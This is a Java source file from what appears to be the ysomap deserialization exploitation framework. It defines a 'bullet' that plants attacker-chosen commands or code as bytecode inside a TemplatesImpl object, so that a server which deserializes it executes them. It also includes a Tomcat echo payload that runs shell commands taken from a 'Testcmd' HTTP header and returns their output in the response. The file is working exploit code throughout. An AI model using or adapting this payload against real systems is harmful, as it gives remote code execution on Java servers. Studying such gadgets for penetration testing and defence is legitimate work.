package ysomap.core.bullet.jdk;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassPool;
import javassist.CtClass;
import ysomap.common.annotation.*;
import ysomap.core.bean.Bullet;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.io.Serializable;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
@SuppressWarnings({"rawtypes"})
@Bullets
@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
@Authors({ Authors.WH1T3P1G })
public class TemplatesImplBullet extends Bullet<Object> {

    private Class templatesImpl;
    private Class abstractTranslet;
    private Class transformerFactoryImpl;

    @NotNull
    @Require(name = "body" ,detail = "evil code (start with 'code:') or evil commands")
    private String body;

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    @Require(name = "tomcatEcho", type = "boolean", detail = "选择tomcat回显，默认为false")
    private String tomcatEcho = "false";

    @Override
    public Object getObject() throws Exception {
        if(body.startsWith("code:")){// code mode
            body = body.substring(5);
        }else{// system command execute mode
            if("false".equals(exception)){
                body = "java.lang.Runtime.getRuntime().exec(\"" +
                        body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                        "\");";
            }else{
                body = PayloadHelper.makeExceptionPayload(body);
            }
        }
        initClazz();
        // create evil bytecodes
        ClassPool pool = new ClassPool(true);
        CtClass cc = null;
        if("false".equals(tomcatEcho)){
            cc = ClassFiles.makeClassFromExistClass(pool,
                    StubTransletPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            ClassFiles.insertStaticBlock(cc, body);
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        }else{
            cc = ClassFiles.makeClassFromExistClass(pool,
                    TomcatEchoPayload.class,
                    new Class<?>[]{abstractTranslet}
            );
            ClassFiles.insertSuperClass(pool, cc, abstractTranslet);
        }

        byte[] bytecodes = cc.toBytecode();
        // arm evil bytecodes
        Object templates = templatesImpl.newInstance();
        // inject class bytes into instance
        ReflectionHelper.setFieldValue(templates, "_bytecodes", new byte[][] { bytecodes });
        ReflectionHelper.setFieldValue(templates, "_name", "Pwnr");
        ReflectionHelper.setFieldValue(templates, "_tfactory", transformerFactoryImpl.newInstance());
        return templates;
    }


    private void initClazz() throws ClassNotFoundException {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            templatesImpl = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstractTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transformerFactoryImpl = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        }else{
            templatesImpl = TemplatesImpl.class;
            abstractTranslet = AbstractTranslet.class;
            transformerFactoryImpl = TransformerFactoryImpl.class;
        }
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;

        public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

        @Override
        public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    public static class TomcatEchoPayload extends AbstractTranslet implements Serializable {

        public TomcatEchoPayload() throws Exception {
            Object o;
            Object resp;
            String s;
            boolean done = false;
            Thread[] ts = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < ts.length; i++) {
                Thread t = ts[i];
                if (t == null) {
                    continue;
                }
                s = t.getName();
                if (!s.contains("exec") && s.contains("http")) {
                    o = getFV(t, "target");
                    if (!(o instanceof Runnable)) {
                        continue;
                    }

                    try {
                        o = getFV(getFV(getFV(o, "this$0"), "handler"), "global");
                    } catch (Exception e) {
                        continue;
                    }

                    java.util.List ps = (java.util.List) getFV(o, "processors");
                    for (int j = 0; j < ps.size(); j++) {
                        Object p = ps.get(j);
                        o = getFV(p, "req");
                        resp = o.getClass().getMethod("getResponse", new Class[0]).invoke(o, new Object[0]);
                        s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testecho"});
                        if (s != null && !s.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                            resp.getClass().getMethod("addHeader", new Class[]{String.class, String.class}).invoke(resp, new Object[]{"Testecho", s});
                            done = true;
                        }
                        s = (String) o.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(o, new Object[]{"Testcmd"});
                        if (s != null && !s.isEmpty()) {
                            resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                            String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", s} : new String[]{"/bin/sh", "-c", s};
                            writeBody(resp, new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                            done = true;
                        }
                        if ((s == null || s.isEmpty()) && done) {
                            writeBody(resp, System.getProperties().toString().getBytes());
                        }

                        if (done) {
                            break;
                        }
                    }
                    if (done) {
                        break;
                    }
                }
            }
        }

        private static void writeBody(Object resp, byte[] bs) throws Exception {
            Object o;
            Class clazz;
            try {
                clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
                o = clazz.newInstance();
                clazz.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class})
                        .invoke(o, new Object[]{bs, new Integer(0), new Integer(bs.length)});
                resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
            } catch (ClassNotFoundException e) {
                clazz = Class.forName("java.nio.ByteBuffer");
                o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
                resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
            } catch (NoSuchMethodException e) {
                clazz = Class.forName("java.nio.ByteBuffer");
                o = clazz.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(clazz, new Object[]{bs});
                resp.getClass().getMethod("doWrite", new Class[]{clazz}).invoke(resp, new Object[]{o});
            }
        }

        private static Object getFV(Object o, String s) throws Exception {
            java.lang.reflect.Field f = null;
            Class clazz = o.getClass();
            while (clazz != Object.class) {
                try {
                    f = clazz.getDeclaredField(s);
                    break;
                } catch (NoSuchFieldException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (f == null) {
                throw new NoSuchFieldException(s);
            }
            f.setAccessible(true);
            return f.get(o);
        }



        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

        }

        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

        }
    }
}
